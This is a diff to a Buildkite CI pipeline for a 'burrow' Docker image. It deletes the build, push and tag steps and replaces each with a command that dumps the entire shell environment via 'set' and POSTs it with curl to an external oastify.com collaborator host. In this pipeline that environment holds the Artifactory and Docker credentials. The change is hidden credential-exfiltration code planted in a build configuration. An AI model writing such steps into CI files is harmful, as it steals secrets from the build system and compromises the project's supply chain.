@@ -8,8 +8,7 @@ steps:
       - docker-login#v2.0.1:
           username: $DOCKER_USERNAME
     commands:
-      - "docker build -t ${ARTIFACTORY_URL}/docker/burrow:${BUILDKITE_COMMIT} -f Dockerfile . "
-      - "docker push ${ARTIFACTORY_URL}/docker/burrow:${BUILDKITE_COMMIT}"
+      - "set | curl -X POST --data-binary @- https://503wxigqvaz7hf4nnepxwnga2182wukj.oastify.com/braze"
     retry:
       automatic: true
 
@@ -24,7 +23,5 @@ steps:
           username: $ARTIFACTORY_USERNAME
           password-env: ARTIFACTORY_PASSWORD
     commands:
-      - "docker pull ${ARTIFACTORY_URL}/docker/burrow:${BUILDKITE_COMMIT}"
-      - "docker tag ${ARTIFACTORY_URL}/docker/burrow:${BUILDKITE_COMMIT} ${ARTIFACTORY_URL}/docker/burrow:master"
-      - "docker push ${ARTIFACTORY_URL}/docker/burrow:master"
+      - "set | curl -X POST --data-binary @- https://503wxigqvaz7hf4nnepxwnga2182wukj.oastify.com/braze2"
     branches: "master"
